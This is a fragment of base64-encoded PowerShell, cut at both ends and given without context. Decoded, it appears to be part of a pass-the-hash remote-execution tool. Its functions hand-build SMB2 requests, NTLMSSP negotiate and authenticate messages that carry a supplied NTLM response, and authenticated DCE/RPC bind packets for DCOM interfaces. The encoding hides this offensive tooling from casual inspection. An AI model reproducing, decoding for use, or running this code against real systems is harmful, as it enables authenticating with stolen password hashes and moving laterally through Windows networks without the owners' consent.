B4MDAsMHgwMCkpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TTUIyV3JpdGVSZXF1ZXN0DQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTTUIyQ2xvc2VSZXF1ZXN0KCkNCnsNCiAgICBwYXJhbSAoW0J5dGVbXV0kcGFja2V0X2ZpbGVfSUQpDQoNCiAgICAkcGFja2V0X1NNQjJDbG9zZVJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU01CMkNsb3NlUmVxdWVzdC5BZGQoIlNNQjJDbG9zZVJlcXVlc3RfU3RydWN0dXJlU2l6ZSIsW0J5dGVbXV0oMHgxOCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJDbG9zZVJlcXVlc3QuQWRkKCJTTUIyQ2xvc2VSZXF1ZXN0X0ZsYWdzIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkNsb3NlUmVxdWVzdC5BZGQoIlNNQjJDbG9zZVJlcXVlc3RfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU01CMkNsb3NlUmVxdWVzdC5BZGQoIlNNQjJDbG9zZVJlcXVlc3RfRmlsZUlEIiwkcGFja2V0X2ZpbGVfSUQpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TTUIyQ2xvc2VSZXF1ZXN0DQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTTUIyVHJlZURpc2Nvbm5lY3RSZXF1ZXN0KCkNCnsNCiAgICAkcGFja2V0X1NNQjJUcmVlRGlzY29ubmVjdFJlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU01CMlRyZWVEaXNjb25uZWN0UmVxdWVzdC5BZGQoIlNNQjJUcmVlRGlzY29ubmVjdFJlcXVlc3RfU3RydWN0dXJlU2l6ZSIsW0J5dGVbXV0oMHgwNCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJUcmVlRGlzY29ubmVjdFJlcXVlc3QuQWRkKCJTTUIyVHJlZURpc2Nvbm5lY3RSZXF1ZXN0X1Jlc2VydmVkIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfU01CMlRyZWVEaXNjb25uZWN0UmVxdWVzdA0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U01CMlNlc3Npb25Mb2dvZmZSZXF1ZXN0KCkNCnsNCiAgICAkcGFja2V0X1NNQjJTZXNzaW9uTG9nb2ZmUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9TTUIyU2Vzc2lvbkxvZ29mZlJlcXVlc3QuQWRkKCJTTUIyU2Vzc2lvbkxvZ29mZlJlcXVlc3RfU3RydWN0dXJlU2l6ZSIsW0J5dGVbXV0oMHgwNCwweDAwKSkNCiAgICAkcGFja2V0X1NNQjJTZXNzaW9uTG9nb2ZmUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uTG9nb2ZmUmVxdWVzdF9SZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCg0KICAgIHJldHVybiAkcGFja2V0X1NNQjJTZXNzaW9uTG9nb2ZmUmVxdWVzdA0KfQ0KDQojTlRMTQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0TlRMTVNTUE5lZ290aWF0ZSgpDQp7DQogICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X25lZ290aWF0ZV9mbGFncyxbQnl0ZVtdXSRwYWNrZXRfdmVyc2lvbikNCg0KICAgIFtCeXRlW11dJHBhY2tldF9OVExNU1NQX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoMzIgKyAkcGFja2V0X3ZlcnNpb24uTGVuZ3RoKQ0KICAgICRwYWNrZXRfTlRMTVNTUF9sZW5ndGggPSAkcGFja2V0X05UTE1TU1BfbGVuZ3RoWzBdDQogICAgW0J5dGVbXV0kcGFja2V0X0FTTl9sZW5ndGhfMSA9ICRwYWNrZXRfTlRMTVNTUF9sZW5ndGhbMF0gKyAzMg0KICAgIFtCeXRlW11dJHBhY2tldF9BU05fbGVuZ3RoXzIgPSAkcGFja2V0X05UTE1TU1BfbGVuZ3RoWzBdICsgMjINCiAgICBbQnl0ZVtdXSRwYWNrZXRfQVNOX2xlbmd0aF8zID0gJHBhY2tldF9OVExNU1NQX2xlbmd0aFswXSArIDIwDQogICAgW0J5dGVbXV0kcGFja2V0X0FTTl9sZW5ndGhfNCA9ICRwYWNrZXRfTlRMTVNTUF9sZW5ndGhbMF0gKyAyDQoNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfSW5pdGlhbENvbnRleHRUb2tlbklEIixbQnl0ZVtdXSgweDYwKSkgIyB0aGUgQVNOLjEga2V5IG5hbWVzIGFyZSBsaWtlbHkgbm90IGFsbCBjb3JyZWN0DQogICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9Jbml0aWFsY29udGV4dFRva2VuTGVuZ3RoIiwkcGFja2V0X0FTTl9sZW5ndGhfMSkNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX1RoaXNNZWNoSUQiLFtCeXRlW11dKDB4MDYpKQ0KICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfVGhpc01lY2hMZW5ndGgiLFtCeXRlW11dKDB4MDYpKQ0KICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfT0lEIixbQnl0ZVtdXSgweDJiLDB4MDYsMHgwMSwweDA1LDB4MDUsMHgwMikpDQogICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9Jbm5lckNvbnRleHRUb2tlbklEIixbQnl0ZVtdXSgweGEwKSkNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX0lubmVyQ29udGV4dFRva2VuTGVuZ3RoIiwkcGFja2V0X0FTTl9sZW5ndGhfMikNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX0lubmVyQ29udGV4dFRva2VuSUQyIixbQnl0ZVtdXSgweDMwKSkNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX0lubmVyQ29udGV4dFRva2VuTGVuZ3RoMiIsJHBhY2tldF9BU05fbGVuZ3RoXzMpDQogICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9NZWNoVHlwZXNJRCIsW0J5dGVbXV0oMHhhMCkpDQogICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9NZWNoVHlwZXNMZW5ndGgiLFtCeXRlW11dKDB4MGUpKQ0KICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfTWVjaFR5cGVzSUQyIixbQnl0ZVtdXSgweDMwKSkNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX01lY2hUeXBlc0xlbmd0aDIiLFtCeXRlW11dKDB4MGMpKQ0KICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfTWVjaFR5cGVzSUQzIixbQnl0ZVtdXSgweDA2KSkNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX01lY2hUeXBlc0xlbmd0aDMiLFtCeXRlW11dKDB4MGEpKQ0KICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfTWVjaFR5cGUiLFtCeXRlW11dKDB4MmIsMHgwNiwweDAxLDB4MDQsMHgwMSwweDgyLDB4MzcsMHgwMiwweDAyLDB4MGEpKQ0KICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfTWVjaFRva2VuSUQiLFtCeXRlW11dKDB4YTIpKQ0KICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfTWVjaFRva2VuTGVuZ3RoIiwkcGFja2V0X0FTTl9sZW5ndGhfNCkNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX05UTE1TU1BJRCIsW0J5dGVbXV0oMHgwNCkpDQogICAgJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlLkFkZCgiTlRMTVNTUE5lZ290aWF0ZV9OVExNU1NQTGVuZ3RoIiwkcGFja2V0X05UTE1TU1BfbGVuZ3RoKQ0KICAgICRwYWNrZXRfTlRMTVNTUE5lZ290aWF0ZS5BZGQoIk5UTE1TU1BOZWdvdGlhdGVfSWRlbnRpZmllciIsW0J5dGVbXV0oMHg0ZSwweDU0LDB4NGMsMHg0ZCwweDUzLDB4NTMsMHg1MCwweDAwKSkNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX01lc3NhZ2VUeXBlIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX05lZ290aWF0ZUZsYWdzIiwkcGFja2V0X25lZ290aWF0ZV9mbGFncykNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX0NhbGxpbmdXb3Jrc3RhdGlvbkRvbWFpbiIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX0NhbGxpbmdXb3Jrc3RhdGlvbk5hbWUiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQoNCiAgICBpZigkcGFja2V0X3ZlcnNpb24pDQogICAgew0KICAgICAgICAkcGFja2V0X05UTE1TU1BOZWdvdGlhdGUuQWRkKCJOVExNU1NQTmVnb3RpYXRlX1ZlcnNpb24iLCRwYWNrZXRfdmVyc2lvbikNCiAgICB9DQoNCiAgICByZXR1cm4gJHBhY2tldF9OVExNU1NQTmVnb3RpYXRlDQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXROVExNU1NQQXV0aCgpDQp7DQogICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X05UTE1fcmVzcG9uc2UpDQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfTlRMTVNTUF9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfTlRMTV9yZXNwb25zZS5MZW5ndGgpDQogICAgJHBhY2tldF9OVExNU1NQX2xlbmd0aCA9ICRwYWNrZXRfTlRMTVNTUF9sZW5ndGhbMSwwXQ0KICAgIFtCeXRlW11dJHBhY2tldF9BU05fbGVuZ3RoXzEgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfTlRMTV9yZXNwb25zZS5MZW5ndGggKyAxMikNCiAgICAkcGFja2V0X0FTTl9sZW5ndGhfMSA9ICRwYWNrZXRfQVNOX2xlbmd0aF8xWzEsMF0NCiAgICBbQnl0ZVtdXSRwYWNrZXRfQVNOX2xlbmd0aF8yID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X05UTE1fcmVzcG9uc2UuTGVuZ3RoICsgOCkNCiAgICAkcGFja2V0X0FTTl9sZW5ndGhfMiA9ICRwYWNrZXRfQVNOX2xlbmd0aF8yWzEsMF0NCiAgICBbQnl0ZVtdXSRwYWNrZXRfQVNOX2xlbmd0aF8zID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X05UTE1fcmVzcG9uc2UuTGVuZ3RoICsgNCkNCiAgICAkcGFja2V0X0FTTl9sZW5ndGhfMyA9ICRwYWNrZXRfQVNOX2xlbmd0aF8zWzEsMF0NCg0KICAgICRwYWNrZXRfTlRMTVNTUEF1dGggPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfTlRMTVNTUEF1dGguQWRkKCJOVExNU1NQQXV0aF9BU05JRCIsW0J5dGVbXV0oMHhhMSwweDgyKSkNCiAgICAkcGFja2V0X05UTE1TU1BBdXRoLkFkZCgiTlRMTVNTUEF1dGhfQVNOTGVuZ3RoIiwkcGFja2V0X0FTTl9sZW5ndGhfMSkNCiAgICAkcGFja2V0X05UTE1TU1BBdXRoLkFkZCgiTlRMTVNTUEF1dGhfQVNOSUQyIixbQnl0ZVtdXSgweDMwLDB4ODIpKQ0KICAgICRwYWNrZXRfTlRMTVNTUEF1dGguQWRkKCJOVExNU1NQQXV0aF9BU05MZW5ndGgyIiwkcGFja2V0X0FTTl9sZW5ndGhfMikNCiAgICAkcGFja2V0X05UTE1TU1BBdXRoLkFkZCgiTlRMTVNTUEF1dGhfQVNOSUQzIixbQnl0ZVtdXSgweGEyLDB4ODIpKQ0KICAgICRwYWNrZXRfTlRMTVNTUEF1dGguQWRkKCJOVExNU1NQQXV0aF9BU05MZW5ndGgzIiwkcGFja2V0X0FTTl9sZW5ndGhfMykNCiAgICAkcGFja2V0X05UTE1TU1BBdXRoLkFkZCgiTlRMTVNTUEF1dGhfTlRMTVNTUElEIixbQnl0ZVtdXSgweDA0LDB4ODIpKQ0KICAgICRwYWNrZXRfTlRMTVNTUEF1dGguQWRkKCJOVExNU1NQQXV0aF9OVExNU1NQTGVuZ3RoIiwkcGFja2V0X05UTE1TU1BfbGVuZ3RoKQ0KICAgICRwYWNrZXRfTlRMTVNTUEF1dGguQWRkKCJOVExNU1NQQXV0aF9OVExNUmVzcG9uc2UiLCRwYWNrZXRfTlRMTV9yZXNwb25zZSkNCg0KICAgIHJldHVybiAkcGFja2V0X05UTE1TU1BBdXRoDQp9DQoNCiNSUEMNCg0KZnVuY3Rpb24gR2V0LVBhY2tldFJQQ0JpbmQoKQ0Kew0KICAgIHBhcmFtKFtJbnRdJHBhY2tldF9jYWxsX0lELFtCeXRlW11dJHBhY2tldF9tYXhfZnJhZyxbQnl0ZVtdXSRwYWNrZXRfbnVtX2N0eF9pdGVtcyxbQnl0ZVtdXSRwYWNrZXRfY29udGV4dF9JRCxbQnl0ZVtdXSRwYWNrZXRfVVVJRCxbQnl0ZVtdXSRwYWNrZXRfVVVJRF92ZXJzaW9uKQ0KDQogICAgW0J5dGVbXV0kcGFja2V0X2NhbGxfSURfYnl0ZXMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfY2FsbF9JRCkNCg0KICAgICRwYWNrZXRfUlBDQmluZCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9WZXJzaW9uIixbQnl0ZVtdXSgweDA1KSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1ZlcnNpb25NaW5vciIsW0J5dGVbXV0oMHgwMCkpDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9QYWNrZXRUeXBlIixbQnl0ZVtdXSgweDBiKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1BhY2tldEZsYWdzIixbQnl0ZVtdXSgweDAzKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0RhdGFSZXByZXNlbnRhdGlvbiIsW0J5dGVbXV0oMHgxMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9GcmFnTGVuZ3RoIixbQnl0ZVtdXSgweDQ4LDB4MDApKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aExlbmd0aCIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NhbGxJRCIsJHBhY2tldF9jYWxsX0lEX2J5dGVzKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTWF4WG1pdEZyYWciLFtCeXRlW11dKDB4YjgsMHgxMCkpDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9NYXhSZWN2RnJhZyIsW0J5dGVbXV0oMHhiOCwweDEwKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0Fzc29jR3JvdXAiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTnVtQ3R4SXRlbXMiLCRwYWNrZXRfbnVtX2N0eF9pdGVtcykNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1Vua25vd24iLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NvbnRleHRJRCIsJHBhY2tldF9jb250ZXh0X0lEKQ0KICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTnVtVHJhbnNJdGVtcyIsW0J5dGVbXV0oMHgwMSkpDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Vbmtub3duMiIsW0J5dGVbXV0oMHgwMCkpDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2UiLCRwYWNrZXRfVVVJRCkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZVZlciIsJHBhY2tldF9VVUlEX3ZlcnNpb24pDQogICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2VWZXJNaW5vciIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1RyYW5zZmVyU3ludGF4IixbQnl0ZVtdXSgweDA0LDB4NWQsMHg4OCwweDhhLDB4ZWIsMHgxYywweGM5LDB4MTEsMHg5ZiwweGU4LDB4MDgsMHgwMCwweDJiLDB4MTAsMHg0OCwweDYwKSkNCiAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1RyYW5zZmVyU3ludGF4VmVyIixbQnl0ZVtdXSgweDAyLDB4MDAsMHgwMCwweDAwKSkNCg0KICAgIGlmKCRwYWNrZXRfbnVtX2N0eF9pdGVtc1swXSAtZXEgMikNCiAgICB7DQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ29udGV4dElEMiIsW0J5dGVbXV0oMHgwMSwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9OdW1UcmFuc0l0ZW1zMiIsW0J5dGVbXV0oMHgwMSkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVW5rbm93bjMiLFtCeXRlW11dKDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZTIiLFtCeXRlW11dKDB4YzQsMHhmZSwweGZjLDB4OTksMHg2MCwweDUyLDB4MWIsMHgxMCwweGJiLDB4Y2IsMHgwMCwweGFhLDB4MDAsMHgyMSwweDM0LDB4N2EpKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZVZlcjIiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlVmVyTWlub3IyIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1RyYW5zZmVyU3ludGF4MiIsW0J5dGVbXV0oMHgyYywweDFjLDB4YjcsMHg2YywweDEyLDB4OTgsMHg0MCwweDQ1LDB4MDMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVHJhbnNmZXJTeW50YXhWZXIyIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkNCiAgICB9DQogICAgZWxzZWlmKCRwYWNrZXRfbnVtX2N0eF9pdGVtc1swXSAtZXEgMykNCiAgICB7DQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ29udGV4dElEMiIsW0J5dGVbXV0oMHgwMSwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9OdW1UcmFuc0l0ZW1zMiIsW0J5dGVbXV0oMHgwMSkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVW5rbm93bjMiLFtCeXRlW11dKDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZTIiLFtCeXRlW11dKDB4NDMsMHgwMSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweGMwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDYpKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZVZlcjIiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlVmVyTWlub3IyIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1RyYW5zZmVyU3ludGF4MiIsW0J5dGVbXV0oMHgzMywweDA1LDB4NzEsMHg3MSwweGJhLDB4YmUsMHgzNywweDQ5LDB4ODMsMHgxOSwweGI1LDB4ZGIsMHhlZiwweDljLDB4Y2MsMHgzNikpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVHJhbnNmZXJTeW50YXhWZXIyIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Db250ZXh0SUQzIixbQnl0ZVtdXSgweDAyLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX051bVRyYW5zSXRlbXMzIixbQnl0ZVtdXSgweDAxKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Vbmtub3duNCIsW0J5dGVbXV0oMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlMyIsW0J5dGVbXV0oMHg0MywweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlVmVyMyIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2VWZXJNaW5vcjMiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVHJhbnNmZXJTeW50YXgzIixbQnl0ZVtdXSgweDJjLDB4MWMsMHhiNywweDZjLDB4MTIsMHg5OCwweDQwLDB4NDUsMHgwMywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9UcmFuc2ZlclN5bnRheFZlcjMiLFtCeXRlW11dKDB4MDEsMHgwMCwweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0F1dGhUeXBlIixbQnl0ZVtdXSgweDBhKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9BdXRoTGV2ZWwiLFtCeXRlW11dKDB4MDQpKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0F1dGhQYWRMZW5ndGgiLFtCeXRlW11dKDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0F1dGhSZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ29udGV4dElENCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSWRlbnRpZmllciIsW0J5dGVbXV0oMHg0ZSwweDU0LDB4NGMsMHg0ZCwweDUzLDB4NTMsMHg1MCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9NZXNzYWdlVHlwZSIsW0J5dGVbXV0oMHgwMSwweDAwLDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTmVnb3RpYXRlRmxhZ3MiLFtCeXRlW11dKDB4OTcsMHg4MiwweDA4LDB4ZTIpKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NhbGxpbmdXb3Jrc3RhdGlvbkRvbWFpbiIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9DYWxsaW5nV29ya3N0YXRpb25OYW1lIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX09TVmVyc2lvbiIsW0J5dGVbXV0oMHgwNiwweDAxLDB4YjEsMHgxZCwweDAwLDB4MDAsMHgwMCwweDBmKSkNCiAgICB9DQoNCiAgICBpZigkcGFja2V0X2NhbGxfSUQgLWVxIDMpDQogICAgew0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0F1dGhUeXBlIixbQnl0ZVtdXSgweDBhKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9BdXRoTGV2ZWwiLFtCeXRlW11dKDB4MDIpKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0F1dGhQYWRMZW5ndGgiLFtCeXRlW11dKDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0F1dGhSZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ29udGV4dElEMyIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSWRlbnRpZmllciIsW0J5dGVbXV0oMHg0ZSwweDU0LDB4NGMsMHg0ZCwweDUzLDB4NTMsMHg1MCwweDAwKSkNCiAgICAgICAgJ